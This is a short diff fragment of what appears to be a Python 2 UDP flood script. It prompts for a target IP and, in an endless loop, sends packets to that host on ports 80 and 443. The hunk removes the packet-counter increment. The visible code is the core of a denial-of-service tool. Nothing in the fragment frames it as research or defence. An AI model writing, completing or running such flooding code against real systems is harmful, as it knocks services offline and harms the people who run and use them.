@@ -14,5 +14,4 @@ ip = raw_input("IP Target : ")
 while True:
      sock.sendto(bytes, (ip,80))
      sock.sendto(bytes, (ip,443))
-     sent = sent + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,80)
